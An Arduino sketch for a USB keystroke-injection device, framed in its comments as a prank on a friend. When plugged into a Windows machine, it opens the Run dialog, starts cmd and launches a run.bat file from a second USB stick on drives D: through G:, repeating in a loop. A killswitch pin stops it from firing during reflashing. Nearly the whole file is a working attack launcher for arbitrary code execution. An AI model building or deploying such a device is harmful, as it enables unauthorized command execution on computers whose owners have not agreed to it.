#include <Keyboard.h>

int Killswitch = 2;       // It's recommended to solder a jumper to pin 2 to prevent triggering during programming

void setup() 
{
  pinMode(Killswitch, INPUT_PULLUP);        //Sets Killswitch pin to pullup
  
  // Uncomment the keyboard layout of your target computer. US is enabled by default
  Keyboard.begin(KeyboardLayout_en_US);      // US
  //Keyboard.begin(KeyboardLayout_da_DK);    // Denmark
  //Keyboard.begin(KeyboardLayout_de_DE);    // Germany
  //Keyboard.begin(KeyboardLayout_fr_FR);    // France
  //Keyboard.begin(KeyboardLayout_es_ES);    // Spain
  //Keyboard.begin(KeyboardLayout_hu_HU);    // Hungary
  //Keyboard.begin(KeyboardLayout_it_IT);    // Italy
  //Keyboard.begin(KeyboardLayout_pt_PT);    // Portugal
  //Keyboard.begin(KeyboardLayout_sv_SE);    // Sweden
}

void loop() 
{
  while(digitalRead(Killswitch) == HIGH)  //Loop that prevents payload launch when reflashing
  {
    delay(500);
  }
  
  Keyboard.press(KEY_LEFT_GUI);   //Press Windows Key
  Keyboard.press('r');            //Press r key
  delay(100);
  Keyboard.releaseAll();          // Release keys after "run" is launched
  Keyboard.println("cmd");        // Lanch cmd
  delay(500);                     // Wait for cmd to start up (Increase if you're using Potato PCs)

  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
  Keyboard.println("D:");           // Type USB drive letter into cmd
  Keyboard.println("run.bat");      // start run.bat (If path to run.bat changes, include it here)
  
  // Optionally uncomment the lines below if your computer uses multiple drives. The drive letter should always be one more than the computer alreade has
  //Keyboard.println("E:");
  //Keyboard.println("run.bat");
  //Keyboard.println("F:");
  //Keyboard.println("run.bat");
  //Keyboard.println("G:");
  //Keyboard.println("run.bat");
  delay(1000);    // Your time to laugh as you just scared your friend
}
